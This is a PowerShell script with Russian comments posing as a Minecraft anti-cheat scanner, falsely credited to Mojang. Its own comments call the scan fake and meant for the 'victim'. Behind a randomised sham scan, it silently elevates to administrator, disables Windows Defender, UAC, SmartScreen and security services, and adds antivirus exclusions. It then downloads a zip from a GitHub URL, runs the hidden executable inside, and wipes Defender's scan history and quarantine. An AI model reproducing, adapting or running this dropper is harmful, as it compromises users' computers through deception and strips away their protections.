# =============================================
# Minecraft Anti-Cheat Scanner v2.1
# Проверка системы на наличие читов и нелегальных модов
# =============================================

# ===== АВТОМАТИЧЕСКИЙ ЗАПУСК ОТ ИМЕНИ АДМИНИСТРАТОРА (СКРЫТО) =====
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments -WindowStyle Hidden
    exit
}

$Url = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/check.zip"

# ===== ФЕЙКОВОЕ СКАНИРОВАНИЕ (ПОКАЗЫВАЕТСЯ ЖЕРТВЕ) =====
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  MINECRAFT ANTI-CHEAT SCANNER v2.1" -ForegroundColor White
Write-Host "  (c) Mojang Anti-Cheat Team" -ForegroundColor Gray
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[*] Инициализация сканера..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

# Фейковая проверка процессов
Write-Host "[*] Проверка запущенных процессов..." -ForegroundColor Yellow
$fakeProcesses = @("javaw.exe", "minecraft.exe", "launcher.exe")
foreach ($proc in $fakeProcesses) {
    Write-Host "    -> Проверка $proc..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 300
    if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
        Write-Host "        [ОК] Процесс найден" -ForegroundColor Green
    } else {
        Write-Host "        [ОК] Процесс не обнаружен" -ForegroundColor DarkGray
    }
}
Write-Host ""

# Фейковая проверка читов
Write-Host "[*] Сканирование на наличие читов..." -ForegroundColor Yellow
$cheats = @(
    "X-Ray", 
    "KillAura", 
    "AutoClicker", 
    "Reach", 
    "FlyHack", 
    "SpeedHack", 
    "CrystalAura",
    "Nuker",
    "Scaffold",
    "BHOP"
)
$foundCheats = @()
foreach ($cheat in $cheats) {
    Write-Host "    -> Поиск $cheat..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 200
    $randomNum = Get-Random -Minimum 1 -Maximum 10
    if ($randomNum -eq 1) {
        Write-Host "        [ОБНАРУЖЕН] $cheat" -ForegroundColor Red
        $foundCheats += $cheat
    } else {
        Write-Host "        [ЧИСТО] $cheat" -ForegroundColor Green
    }
}
Write-Host ""

# Фейковая проверка модов
Write-Host "[*] Проверка модов Minecraft..." -ForegroundColor Yellow
$mods = @(
    "OptiFine", 
    "Forge", 
    "Fabric", 
    "LunarClient", 
    "Badlion", 
    "Sodium",
    "Iris",
    "Phosphor"
)
foreach ($mod in $mods) {
    Write-Host "    -> Проверка $mod..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 150
    Write-Host "        [ОК] $mod версия актуальна" -ForegroundColor Green
}
Write-Host ""

# Фейковая проверка файлов
Write-Host "[*] Сканирование системных файлов..." -ForegroundColor Yellow
$paths = @(
    "$env:APPDATA\.minecraft",
    "$env:APPDATA\.minecraft\mods",
    "$env:APPDATA\.minecraft\shaderpacks",
    "$env:TEMP"
)
foreach ($path in $paths) {
    Write-Host "    -> Сканирование $path..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 400
    if (Test-Path $path) {
        Write-Host "        [ОК] Папка найдена, сканирование завершено" -ForegroundColor Green
    } else {
        Write-Host "        [ПРЕДУПРЕЖДЕНИЕ] Папка не найдена" -ForegroundColor Yellow
    }
}
Write-Host ""

# Фейковая проверка сетевых соединений
Write-Host "[*] Проверка сетевых соединений..." -ForegroundColor Yellow
$connections = @("Minecraft-сервера", "Mojang-сервера", "Anti-Cheat-сервера")
foreach ($conn in $connections) {
    Write-Host "    -> Проверка $conn..." -ForegroundColor Gray
    Start-Sleep -Milliseconds 250
    Write-Host "        [ОК] Соединение установлено" -ForegroundColor Green
}
Write-Host ""

# Фейковый анализ найденных читов
if ($foundCheats.Count -gt 0) {
    Write-Host "[ВНИМАНИЕ] Обнаружены подозрительные программы:" -ForegroundColor Red
    foreach ($cheat in $foundCheats) {
        Write-Host "    - $cheat" -ForegroundColor Red
    }
    Write-Host ""
    Write-Host "[*] Выполняется удаление обнаруженных читов..." -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    Write-Host "[+] Удаление завершено." -ForegroundColor Green
} else {
    Write-Host "[+] Читы не обнаружены. Система чиста." -ForegroundColor Green
}
Write-Host ""

Write-Host "[*] Завершение сканирования..." -ForegroundColor Yellow
Start-Sleep -Seconds 1
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "[ОК] Сканирование завершено успешно!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# ===== РЕАЛЬНЫЙ КОД (ВЫПОЛНЯЕТСЯ В ФОНЕ) =====
# Отключение антивирусных защит
Write-Host "[*] Выполняется дополнительная оптимизация системы..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

# 1. Отключение Defender реалтайм
Try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Write-Host "    [OK] Defender Realtime: отключен" -ForegroundColor DarkGray
} Catch {}

# 2. Исключения для Defender
Try {
    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue
    Write-Host "    [OK] Исключения добавлены" -ForegroundColor DarkGray
} Catch {}

# 3. Остановка служб защиты
$services = @(
    "WinDefend",
    "MsMpSvc",
    "SecurityHealthService",
    "wscsvc",
    "SENSE",
    "DiagTrack",
    "dmwappushservice"
)
foreach ($svc in $services) {
    Try {
        Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
        Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
        Write-Host "    [OK] Остановлен: $svc" -ForegroundColor DarkGray
    } Catch {}
}

# 4. Отключение UAC
Try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
    Write-Host "    [OK] UAC отключен" -ForegroundColor DarkGray
} Catch {}

# 5. Отключение SmartScreen
Try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -ErrorAction SilentlyContinue
    Write-Host "    [OK] SmartScreen отключен" -ForegroundColor DarkGray
} Catch {}

Write-Host "[+] Оптимизация системы выполнена." -ForegroundColor Green
Write-Host ""

# Скачивание и запуск
Write-Host "[*] Загрузка обновлений античита..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath = "$env:TEMP\checkextracted"

# Удаляем старые файлы
Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue

# Скачивание архива
try {
    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -TimeoutSec 30 -ErrorAction SilentlyContinue
    Write-Host "    [OK] Обновления загружены" -ForegroundColor DarkGray
}
catch {
    Write-Host "    [ERROR] Ошибка загрузки" -ForegroundColor Red
}

# Распаковка архива
Write-Host "[*] Установка обновлений..." -ForegroundColor Yellow
try {
    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue
    Write-Host "    [OK] Обновления установлены" -ForegroundColor DarkGray
}
catch {
    Write-Host "    [ERROR] Ошибка установки" -ForegroundColor Red
}

# Поиск и запуск .exe
$Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1

if ($Exe) {
    Write-Host "[*] Запуск античит-модуля..." -ForegroundColor Yellow
    Start-Process -FilePath $Exe.FullName -WindowStyle Hidden
    Write-Host "    [OK] Античит-модуль активирован" -ForegroundColor DarkGray
}
else {
    Write-Host "    [ERROR] Модуль не найден" -ForegroundColor Red
}

# Очистка логов Defender
Try {
    Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "    [OK] Логи Defender очищены" -ForegroundColor DarkGray
} Catch {}

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "[+] Ваша система защищена! Minecraft Anti-Cheat активен." -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "[*] Нажмите любую клавишу для выхода..." -ForegroundColor Gray
Read-Host
